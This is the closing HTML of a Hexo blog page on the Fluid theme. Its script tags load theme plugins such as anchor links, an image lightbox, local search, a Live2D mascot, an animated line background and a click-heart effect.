        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>




  
<script src="/z2z_custom/custom.js"></script>
<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/runtime.min.js"></script>



<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/assets/tororo.model.json"},"display":{"position":"right","width":240,"height":480},"mobile":{"show":false},"react":{"opacityDefault":1,"opacityOnHover":1},"log":false,"tagMode":false});</script></body>
</html>



<!--动态线条背景-->
<script type="text/javascript"
color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
</script>


<!-- 页面点击小红心，在末尾添加，避免找不到 -->
<script type="text/javascript" src="/js/click.js"></script>


